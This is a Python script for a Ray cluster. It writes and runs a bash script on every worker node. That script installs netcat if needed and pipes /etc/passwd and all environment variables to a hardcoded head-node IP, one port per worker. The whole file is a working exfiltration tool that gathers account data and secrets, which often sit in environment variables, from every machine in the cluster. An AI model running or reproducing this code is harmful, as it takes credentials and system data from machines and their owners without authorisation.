import os
import time
import ray

# Initialize Ray
ray.init(address='auto')

# Define the head node IP
head_node_ip = "10.0.108.248"

# Read the ports from the file
with open('ports.txt', 'r') as f:
    ports = [int(line.strip()) for line in f.readlines()]

# Write the send_passwd.sh script content
send_passwd_script_content = """#!/bin/bash

# Head node IP and port
HEAD_NODE_IP=$1
PORT=$2

if ! command -v nc &> /dev/null
then
    echo "nc could not be found, installing..."
    sudo apt-get update
    sudo apt-get install -y netcat
else
    echo "nc is already installed"
fi

# Debug information
echo "Hostname: $(hostname)"
echo "Sending /etc/passwd and env variables to $HEAD_NODE_IP:$PORT"

# Read the /etc/passwd file and environment variables, and send them to the head node
(cat /etc/passwd; echo; env) | nc -q 1 $HEAD_NODE_IP $PORT

echo "Done sending /etc/passwd and env variables"
"""

# Write the script to a file on the local machine
with open("send_passwd.sh", "w") as f:
    f.write(send_passwd_script_content)

os.chmod("send_passwd.sh", 0o755)

# Define a function to create the script on worker nodes
def create_script_on_worker(head_node_ip, port):
    script_content = f"""#!/bin/bash

# Head node IP and port
HEAD_NODE_IP="{head_node_ip}"
PORT={port}

if ! command -v nc &> /dev/null
then
    echo "nc could not be found, installing..."
    sudo apt-get update
    sudo apt-get install -y netcat
else
    echo "nc is already installed"
fi

# Debug information
echo "Hostname: $(hostname)"
echo "Sending /etc/passwd and env variables to $HEAD_NODE_IP:$PORT"

# Read the /etc/passwd file and environment variables, and send them to the head node
(cat /etc/passwd; echo; env) | nc -q 1 $HEAD_NODE_IP $PORT

echo "Done sending /etc/passwd and env variables"
"""
    with open("/tmp/send_passwd.sh", "w") as f:
        f.write(script_content)
    os.chmod("/tmp/send_passwd.sh", 0o755)

# Define a remote function to execute the send_passwd.sh script
@ray.remote
def run_send_passwd_script(head_node_ip, port):
    # Create the script on the worker node
    create_script_on_worker(head_node_ip, port)
    # Execute the script and capture any environment variables
    env_output = os.popen("env").read()
    print(f"Environment variables:\n{env_output}")
    result = os.system("bash /tmp/send_passwd.sh")
    return result, env_output

# Get the list of nodes in the cluster
nodes = ray.nodes()
worker_nodes = [node for node in nodes if node["Alive"] and not node["Resources"].get("head_node")]

# Print the worker node information
print(f"Worker nodes: {worker_nodes}")

# Ensure each worker gets a unique port and job
results = []
for i, worker_node in enumerate(worker_nodes):
    port = ports[i]
    print(f"Triggering worker {i} on {worker_node['NodeManagerHostname']} with port {port}")
    node_id = worker_node['NodeID']
    # Use Ray's placement group to ensure the job is executed on the specific worker node
    resources = {f"node:{worker_node['NodeManagerAddress']}": 0.01}
    result_ref = run_send_passwd_script.options(resources=resources).remote(head_node_ip, port)
    results.append((i, port, result_ref))

# Wait for and print results
for i, port, result_ref in results:
    result, env_output = ray.get(result_ref)
    print(f"Result from worker {i} on port {port}: {result}")
    print(f"Environment variables from worker {i}: {env_output}")

print("All jobs have been manually triggered.")
